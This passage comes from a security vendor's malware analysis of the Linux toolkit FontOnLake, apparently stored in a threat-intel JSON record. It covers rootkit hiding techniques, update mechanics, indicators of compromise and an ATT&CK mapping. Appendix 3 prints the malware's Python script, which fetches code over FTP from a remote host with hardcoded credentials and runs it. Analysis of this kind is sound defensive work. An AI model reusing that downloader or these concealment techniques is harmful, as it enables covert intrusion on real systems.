first 4 bytes of the ICMP data are 0xFFFFAB08, it downloads a file into a\n\nrandom file (following the aforementioned /tmp/.tmp_<random> pattern) and executes it.\n\nIt is downloaded from the supplied IP and port, parsed from the rest of the ICMP payload, over TCP/IPv4\n\nin format <size_of_file><file><file_crc-32>. The file is executed in user-mode, its command line is\n\n[set to [kthread] and its environment variables to PATH=/usr/local/bin:/usr/bin:/bin:/usr/](http://bin/usr/bin:/bin:/usr/local/sbin:/usr/sbin)\n```\nlocal/sbin:/usr/sbin.\n\n```\nNote that this functionality was present only in older samples and we could not find such internet\nfacing victims with internet scans, which indicates that it could have been completely dropped.\n\nFigure 10 // Hex-Rays decompilation of the code that can download and execute binaries based on the ICMP packet\n\n#### Version 2\n\nThe second version supports several new commands and implements certain features in a different way.\n\nSome functionality has been dropped: for example, the magic ICMP packets are not supported anymore.\n\nIt also assists the backdoor in its update mechanism and hides all on-disk files following its filename format.\n\n#### The virtual file\n\nThe rootkit creates the virtual file like the other version. The only difference is in the write file operation:\n\nif the size of the received buffer is 8 or 40, a command is executed accordingly; otherwise it appends an\n\nentry to the already described list of collected credentials. It uses the commands in Table 10, where only\n\nthe last 4 require size 40, the others 8.\n\n\n-----\n\nTable 10 // List of rootkit commands\n\nCommand Description\n\nIf not already set, sets a variable containing PID of its main backdoor. PID of the calling process is added to a\n0xFF11\nlist of PIDs to be hidden.\n\n0xE44E Does not do anything currently.\n\n0x55AA Updates list of files to be hidden.\n\n0x66BB Does not do anything currently.\n\n0x66BC Terminates the main backdoor and removes its on-disk file.\n\nSets a global variable need_inject_sshd to the supplied parameter. Its purpose is unknown, it is probably under\n0x66BD\ndevelopment.\n\nExposes a global variable need_inject_sshd via copy_to_user() to the caller and unsets it. Its purpose is\n0x66BE\nunknown, it is probably under development.\n\nExposes file-path of inject.so library, which is probably intended to be injected into certain processes by the\n0xA43F\nbackdoor, to the caller. The backdoor does not fully implement this functionality yet.\n\n0xA45F Sets file-path of inject.so library to the caller-supplied buffer.\n\nInitializes the update mechanism and receives a file-path, which should contain the to-be-updated\n0xF33F\nbackdoor.\n\n0xF34F Exposes a file-path to the caller, which contains the updated version of the backdoor.\n\n#### inject.so\n\n_inject.so overrides system calls execve, fork and bash to conceal output of the ss tool and log bash_\n\nhistory.\n\n[It unsets environment variable LD_PRELOAD to block attempts to use the LD_PRELOAD trick on the](https://www.baeldung.com/linux/ld_preload-trick-what-is)\n\nexecutable running this library.\n\nIt checks whether the file it runs under is /bin/bash whose command line is -bash, i.e., the default\n\nshell or /usr/bin/ss. In such cases, it hooks fork – executes the original fork acquired by dlsym with\n```\nRTLD_DEFAULT and unsets the indicators that it runs under bash or ss in the child process, but they can\n\n```\nbe still set later.\n\nIf it runs under ss, it hooks execve; the hook calls the original execve with output filtered through\n\npipes, searches for its non-standard ports, and discards them from the output.\n\nIf it runs under bash, function bash_add_history, whose address is acquired by dlsym with RTLD_\n```\nDEFAULT, default library search order, is hooked using the subhook library. The hook calls the real bash_\nadd_history and acquires symbol current_user using dlsym with RTLD_DEFAULT. The symbol is\n\n```\nused to get UID <bash_uid> and GUID <bash_guid> present in bash in the current_user structure\n\nand writes |1|<time_since_epoch>|<ppid>|<pid>|<sid>|<bash_uid>|<bash_gid>|<history_\n```\nentry> to the virtual file.\n\n```\nThe rootkit generates a random name following its filename pattern, notes the file-path and writes the\n\nembedded file to the location. It also sets permissions of the file to 755. It has no other use currently; it\n\nis apparently under development.\n\n\n-----\n\n#### Empty alloc_pid hook\n\nThe rootkit uses method register_kretprobe to register kretprobe for alloc_pid symbol_name; it\n\ndoes not register any handler and it does not seem to use it anywhere in the code, which suggests that\n\nit might be some functionality in development.\n\nIt is most likely going to be used with the shared library injection functionality somehow.\n\n#### Termination of hidden processes\n\nWhen one of the hidden processes is to be terminated, it needs to remove its PID from the list of PIDs to\n\nbe hidden.\n\nThis is achieved by using method register_kprobe to register kprobe for do_exit symbol_name:\n\nit registers a pre_handler that checks whether the PID of process to exit is present in the list of PIDs\n\nto be hidden. In that case, it removes the PID from the list. Additionally, if the PID belongs to the main\n\nbackdoor, it sets a variable indicating that there is no main backdoor – it is required to enable an\n\nupdated one to register itself.\n\n#### Hiding memory regions\n\nTo hide memory regions mapped from its files, the rootkit uses method register_kretprobe to\n\nregister kretprobe for seq_path symbol_name, it registers both handler and entry_handler and sets\n\ndata_size to 8:\n\n- entry_handler – instructs kernel threads to be skipped: a kernel thread is recognized by checking\n\n[whether mm structure of the current task_struct is a null pointer. It also moves the DI register, which](https://www.kernel.org/doc/html/latest/vm/active_mm.html)\n\nis the first parameter – seq_file, to the kretprobe_instance data.\n\n- handler – instructs kernel threads to be skipped in the same way as before. If the last entry contains\n\nthe substring /tmp/.tmp_, it trims it, which effectively hides the presence of memory-mapped\n\nregions, unless the PID of the caller belongs to the main backdoor.\n\nIt seems that this technique has not been documented yet. The method seq_path is used especially\n\n[by show_map, which lists memory regions in /proc/<PID>/maps. It is most likely supposed to hide its](https://elixir.bootlin.com/linux/latest/source/fs/proc/task_mmu.c#L334)\n\nlibraries that are injected to other, legitimate processes.\n\n\n-----\n\nFigure 11 // Hex-Rays decompilation of the seq_path handler\n\n#### Hiding processes and files\n\nThe rootkit overrides the system call getdents to hide certain processes and files as in the previous\n\nversion. In comparison to the other version, it hides more files – the rootkit and those following its\n\nfilename format (/tmp/.tmp_<random>) that weren’t present on-disk in the other version.\n\nThe main modifications are in filldir, which is used by getdents: it skips further processing and\n\nreturns to hide the target file if it is:\n\n- under /proc and is the virtual file or present in the list of the PIDs to be hidden.\n\n- under /tmp, begins with .tmp_ and the PID of the caller does not belong to the main backdoor.\n\n- `/lib/modules/kernel_ver/kernel/drivers/input/misc/ati_remote3.ko or /etc/`\n\nsysconfig/modules/ati_remote3.modules.\n\n#### Hiding network connections\n\nThe rootkit hooks tcp4_seq_show() seq_operation in the same way as in the other version to hide its\n\nnetwork connections.\n\n\n-----\n\n#### Hiding itself (its own kernel module)\n```\nseq_show() seq_operation of /proc/modules is hooked by the rootkit to hide itself from the list. This\n\n```\nis achieved by calling the original one and checking the result for ati_remote3.ko; if it is found, the\n\nlast entry is discarded – it is not known what the reason for this is, since the next step would hide it\n\nfrom the output of /proc/modules implicitly.\n\nIt also unlinks its kobject via the kobject_del() method, which will hide it from the lsmod command\n\nexecuted as root as well.\n\n#### Update mechanism\n\nTo update, the rootkit terminates the main running backdoor and removes its on-disk file; it\n\nsubsequently copies the updated version downloaded by the backdoor to the original location, sets its\n\npermissions to 755, and executes it with command line [khelper].\n\nIf the process fails for whatever reason, it generates a random name following its filename format,\n\nwrites the original embedded backdoor to the file and executes it in the same way.\n\n## CONCLUSION\n\nWe have found and described a set of malicious and at the time of discovery unknown tools which do\n\nnot seem to belong to any recognized malware family. Their scale and advanced design suggest that the\n\nauthors are well versed in cybersecurity and that these tools might be reused in future campaigns.\n\nAs most of the features are designed just to hide its presence, relay communication, and provide\n\nbackdoor access, we believe that these tools are used mostly to maintain an infrastructure which serves\n\nsome other, unknown, malicious purposes.\n\nIn the past we described an operation that shared certain behavioral patterns; similarly, it collected\n```\nsshd credentials to compromise further machines, built its infrastructure out of afflicted servers and\n\n```\ninjected a dynamic library using DT_NEEDED into processes, which hooked execve as well. However, its\n\n[scale and impact were much greater. If interested, you can read about Operation Windigo in this white](https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf)\n\n_[paper and this follow-up blogpost.](https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf)_\n\n\n-----\n\n## IOCS\n\n### Samples\n\nSHA-1 Description Detection name\n\n`1F52DB8E3FC3040C017928F5FFD99D9FA4757BF8` Trojanized cat\n\n`771340752985DD8E84CF3843C9843EF7A76A39E7` Trojanized kill\n\n`27E868C0505144F0708170DF701D7C1AE8E1FAEA` Trojanized sftp\n\n`45E94ABEDAD8C0044A43FF6D72A5C44C6ABD9378` Trojanized sshd\n\n`1829B0E34807765F2B254EA5514D7BB587AECA3F` Custom sshd\n\n`8D6ACA824D1A717AE908669E356E2D4BB6F857B0` Custom sshd\n\n`38B09D690FAFE81E964CBD45EC7CF20DCB296B4D` Backdoor 1\n\n`56556A53741111C04853A5E84744807EEADFF63A` Backdoor 1\n\n`FE26CB98AA1416A8B1F6CED4AC1B5400517257B2` Backdoor 1\n\n`D4E0E38EC69CBB71475D8A22EDB428C3E955A5EA` Backdoor 1\n\n`204046B3279B487863738DDB17CBB6718AF2A83A` Backdoor 2\n\n`9C803D1E39F335F213F367A84D3DF6150E5FE172` Backdoor 2\n\n\n`BFCC4E6628B63C92BC46219937EA7582EA6FBB41` Backdoor 2\n\n`515CFB5CB760D3A1DA31E9F906EA7F84F17C5136` Backdoor 3\n\n`A9ED0837E3AF698906B229CA28B988010BCD5DC1` Backdoor 3\n\n`56CB85675FE7A7896F0AA5365FF391AC376D9953` Rootkit version 1\n\n`72C9C5CE50A38D0A2B9CEF6ADEAB1008BFF12496` Rootkit version 1\n\n`B439A503D68AD7164E0F32B03243A593312040F8` Rootkit version 1\n\n`E7BF0A35C2CD79A658615E312D35BBCFF9782672` Rootkit version 1\n\n`56580E7BA6BF26D878C538985A6DC62CA094CD04` Rootkit version 1\n\n`49D4E5FCD3A3018A88F329AE47EF4C87C6A2D27A` Rootkit version 1\n\n`74D44C2949DA7D5164ADEC78801733680DA8C110` Rootkit version 2\n\n`74D755E8566340A752B1DB603EF468253ADAB6BD` Rootkit version 2\n\n`E20F87497023E3454B5B1A22FE6C5A5501EAE2CB` Rootkit version 2\n```\n6F43C598CD9E63F550FF4E6EF51500E47D0211F3 inject.so\n\n```\n\nLinux/FontOnLake\n\n\n-----\n\n### C&Cs\n\n#### From samples:\n```\n47.107.60[.]212\n47.112.197[.]119\n156.238.111[.]174\n172.96.231[.]69\nhm2.yrnykx[.]com\nywbgrcrupasdiqxknwgceatlnbvmezti[.]com\nyhgrffndvzbtoilmundkmvbaxrjtqsew[.]com\nwcmbqxzeuopnvyfmhkstaretfciywdrl[.]name\nruciplbrxwjscyhtapvlfskoqqgnxevw[.]name\npdjwebrfgdyzljmwtxcoyomapxtzchvn[.]com\nnfcomizsdseqiomzqrxwvtprxbljkpgd[.]name\nhkxpqdtgsucylodaejmzmtnkpfvojabe[.]com\n\n```\netzndtcvqvyxajpcgwkzsoweaubilflh[.]com\n```\nesnoptdkkiirzewlpgmccbwuynvxjumf[.]name\nekubhtlgnjndrmjbsqitdvvewcgzpacy[.]name\n\n#### From internet-wide scan:\n27.102.130[.]63\n\n### Filenames\n/lib/modules/<VARIABLE>/kernel/drivers/input/misc/ati_remote3.ko\n\n```\n/etc/sysconfig/modules/ati_remote3.modules\n```\n/tmp/.tmp_<RANDOM>\n\n### Virtual filenames\n/proc/.dot3\n/proc/.inl\n\n```\n\n-----\n\n## MITRE ATT&CK TECHNIQUES\n\n_[This table was built using version 9 of the ATT&CK framework.](https://attack.mitre.org/versions/)_\n\nTactic ID Name Description\n\nInitial Access _[T1078](https://attack.mitre.org/techniques/T1078/)_ Valid Accounts FontOnLake can collect at least SSH credentials.\n\nCommand and Scripting Interpreter:\n_[T1059.004](https://attack.mitre.org/techniques/T1059/004/)_ FontOnLake enables execution of Unix shell commands.\nUnix Shell\n\n\nExecution\n\nPersistence\n\nDefense Evasion\n\n\nCommand and Scripting Interpreter:\n_[T1059.006](https://attack.mitre.org/techniques/T1059/006/)_ FontOnLake enables execution of arbitrary Python scripts.\nPython\n\nFontOnLake uses fork() to create additional processes\n_[T1106](https://attack.mitre.org/techniques/T1106/)_ Native API\nsuch as sshd.\n\nFontOnLake trojanizes standard tools such as cat to\n_[T1204](https://attack.mitre.org/techniques/T1204/)_ User Execution\nexecute itself.\n\nBoot or Logon Autostart Execution: One of FontOnLake’s rootkits can be executed with a\n_[T1547.006](https://attack.mitre.org/techniques/T1547/006/)_\nKernel Modules and Extensions startup script.\n\nFontOnLake creates a system startup script ati_\n_[T1037](https://attack.mitre.org/techniques/T1037/)_ Boot or Logon Initialization Scripts\n```\n                          remote3.modules.\n\n```\nFontOnLake modifies several standard binaries to achieve\n_[T1554](https://attack.mitre.org/techniques/T1554/)_ Compromise Client Software Binary\npersistence.\n\n\nFontOnLake hides its connections and processes with\n_[T1564](https://attack.mitre.org/techniques/T1564/001/)_ Hide Artifacts\nrootkits.\n\nHide Artifacts: Hidden Files and\n_[T1564.001](https://attack.mitre.org/techniques/T1564/001/)_ FontOnLake hides its files with rootkits.\nDirectories\n\n_[T1027](https://attack.mitre.org/techniques/T1027/)_ Obfuscated Files or Information Many FontOnLake executables are packed with UPX.\n\nFontOnLake uses rootkits to hide the presence of its\n_[T1014](https://attack.mitre.org/techniques/T1014/)_ Rootkit\nprocesses, files, network connections and drivers.\n\n\nDeobfuscate/Decode Files or\n_[T1140](https://attack.mitre.org/techniques/T1140/)_\nInformation\n\n\nSome FontOnLake backdoors use AES to decrypt\nencrypted and serialized communication and base64\ndecode encrypted C&C address.\n\nFontOnLake’s backdoor can change the permissions of\nthe file it wants to execute.\n\n\n_[T1222.002](https://attack.mitre.org/techniques/T1222/002/)_\n\n\nFile and Directory Permissions\nModification: Linux and Mac File and\nDirectory Permissions Modification\n\n\nCredential Access _[T1556](https://attack.mitre.org/techniques/T1556/)_ Modify Authentication Process FontOnLake modifies sshd to collect credentials.\n\n\nDiscovery\n\n\nOne of FontOnLake’s backdoors can list files and\n_[T1083](https://attack.mitre.org/techniques/T1083/)_ File and Directory Discovery\ndirectories.\n\nFontOnLake can collect system information from the\n_[T1082](https://attack.mitre.org/techniques/T1082/)_ System Information Discovery\nvictim’s machine.\n\n\nFontOnLake collects SSH credentials and probably\nLateral Movement _[T1021.004](https://attack.mitre.org/techniques/T1021/004/)_ Remote Services: SSH\nintends to use them for lateral movement.\n\n_[T1090](https://attack.mitre.org/techniques/T1090/)_ Proxy FontOnLake can serve as a proxy.\n\nApplication Layer Protocol: Web\n_[T1071.001](https://attack.mitre.org/techniques/T1071/001/)_ FontOnLake acquires additional C&C over HTTP.\nProtocols\n\nApplication Layer Protocol: File FontOnLake can download additional Python files over\n_[T1071.002](https://attack.mitre.org/techniques/T1071/002/)_\nTransfer Protocols FTP.\n\n_[T1132.001](https://attack.mitre.org/techniques/T1132/001/)_ Data Encoding: Standard Encoding FontOnLake uses base64 to encode HTTPS responses.\n\n\n_[T1568](https://attack.mitre.org/techniques/T1568/)_ Dynamic Resolution\n\n\nFontOnLake can use HTTP to download resources that\ncontain an IP address and port number pair to connect to\nand acquire its C&C. It can use dynamic DNS resolution to\nconstruct and resolve a randomly chosen domain.\n\n\nCommand and\nControl\n\n\nEncrypted Channel: Symmetric FontOnLake uses AES to encrypt communication with\n_[T1573.001](https://attack.mitre.org/techniques/T1573/001/)_\nCryptography C&C.\n\n\n_[T1008](https://attack.mitre.org/techniques/T1008/)_ Fallback Channels\n\n\nFontOnLake can use dynamic DNS resolution to construct\nand resolve a randomly chosen domain. One of its\nrootkits also listens for specially crafted packets, which\ninstruct it to download and execute additional files. It\nalso both connects to a C&C and accepts connections on\nall interfaces.\n\n\n_[T1095](https://attack.mitre.org/techniques/T1095/)_ Non-Application Layer Protocol FontOnLake uses TCP for communication with C&C.\n\nFontOnLake uses a unique, non-standard port for almost\n_[T1571](https://attack.mitre.org/techniques/T1571/)_ Non-Standard Port\nall samples.\n\nExfiltration _[T1041](https://attack.mitre.org/techniques/T1041/)_ Exfiltration Over C2 Channel FontOnLake uses its C&C to exfiltrate collected data.\n\n\n-----\n\n## APPENDIX 1\n\nHardcoded sshd config:\n```\nPort 26657\nListenAddress 127.0.0.1\nProtocol 2\nLogLevel QUIET\nSyslogFacility AUTHPRIV\nIgnoreUserKnownHosts yes\nPasswordAuthentication yes\nAcceptEnv XMODIFIERS\nX11Forwarding yes\nTCPKeepAlive yes\nPermitRootLogin yes\nHostKey /tmp/.ssh/ssh_host_rsa_key\n\n## APPENDIX 2\n\n```\nProtobuf structure used for Backdoor 2’s commands.\n\nID Name Field name Brief notes\n\nkey Encryption key cipher_pass.\n0 Init\n\nsysinfo FontOnLake uses its C&C to exfiltrate collected data.\n\nWas not used explicitly – probably heartbeat, since it has similar name and is\n2 Tick\nnot used anywhere else.\n\n4 Show_Msg message Not used.\n\nsrc_uid Source UID.\n\ndest_uid Destination UID.\n\n5 Forward_Data\n\ncmd _cmd being forwarded._\n\ndata ID of the command to be forwarded.\n\ncmd\nCommonCommand\n\nargs Associative array of Command_Info.\n\n7\n\nname\nCommand_Info\n\nvalue\n\nversion\n8 SystemVersion\n\nsystem\n\n9 Session_Connect uid Not used explicitly – order of the commands suggests that it might be 9.\n\n10 Session_DisConnect uid\n\nfiles Array of List_Info.\nList_Dir\n\ndir\n\nname\n\nmodify_date\n\n\n11\n\n\nList_Info\n\n\nIsdir\n\nsize\n\nexecutable\n\nreadonly\n\nwriteable\n\n\n-----\n\nID Name Field name Brief notes\n\ncode Error code.\n\n\n23 Fwd_Beg\n\n\nmessage Error message.\n\nid Session ID.\n\n\nid Session ID.\n24 Fwd_Ing\n\ndata Data to be forwarded.\n\ncode Error code.\n\n\n25 Fwd_End\n\n\nmessage Error message.\n\nid Session ID.\n\n\n26 RequestVersion app_type String backdoor_<os_name>.\n\nver Latest backdoor version.\n\n\n27 ResponseVersion\n\n28 RequestUpdateDownload\n\n29 ResponseUpdateDownload\n\nSessionInfo\n\n\nsize Size of the latest backdoor version.\n\napp_type Not used.\n\noff Position in the update file.\n\nsize Either 0x8000 or remaining size of the update file.\n\napp_type String backdoor_<os_name>.\n\noff Position in the update file.\n\ndata Data to be written to the file.\n\napp_type String backdoor_<os_name>.\n\ndesc Not used.\n\nhide\n\nuid\n\n\nusername Not used.\nVerify\n\npassword\n\nUpload_Passwd infos Not used and contains an array of PasswordInfo.\n\nprikey Not used.\n\naddress\n\n\nPasswordInfo\n\n\nport\n\nusername\n\npassword\n\n\nHost_List infos Not used and contains an array of Host_Info.\n\nuid Not used.\n\nip\n\nsystem\n\n\nHost_Info\n\n\nhide\n\nversion\n\nonline_time\n\ndesc\n\n\n-----\n\n## APPENDIX 3\n\nPython script to download and execute a file:\n\nimport ftplib, tempfile, os, sys\n\nos.unlink(__file__)\n```\nftp = ftplib.FTP()\nftp.connect(sys.argv[1], int(sys.argv[2]))\nftp.login(‘vsftp’, ‘winter1qa2ws’)\n\n```\ntmp_file = tempfile.mktemp(prefix=’.tmp_’)\n\nfp = open(tmp_file, ‘wb’)\n```\nftp.retrbinary(‘RETR tasks/{0}.py’.format(sys.argv[3]), fp.write, 1024)\nfp.close()\nftp.quit()\n\n```\nexecfile(tmp_file)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2021/10/eset_fontonlake.pdf",
        "https://web-assets.esetstatic.com/wls/2021/10/eset_fontonlake.pdf"
    ],
    "report_names": [
        "eset_fontonlake.pdf"
    ],
    "threat_actors": [
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c39b0fe6-5642-4717-9a05-9e94265e3e3a",
            "created_at": "2022-10-25T16:07:24.332084Z",
            "updated_at": "2025-03-27T02:02:10.175452Z",
            "deleted_at": null,
            "main_name": "Tonto Team",
            "aliases": [
                "Bronze Huntley",
                "CactusPete",
                "Earth Akhlut",
                "HartBeat",
                "Karma Panda",
                "LoneRanger",
                "Operation Bitter Biscuit",
                "TAG-74",
                "Tonto Team"
            ],
            "source_name": "ETDA:Tonto Team",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Bioazih",
                "Bisonal",
                "CONIME",
                "Dexbia",
                "Korlia",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1633603848,
    "ts_modification_date": 1633603896,
    "files": {
        "pdf": "https://archive.orkl.eu/d12845b81e3abd34655647208387d642f8846947.pdf",
        "text": "https://archive.orkl.eu/d12845b81e3abd34655647208387d642f8846947.txt",
        "img": "https://archive.orkl.eu/d12845b81e3abd34655647208387d642f8846947.jpg"
    }
}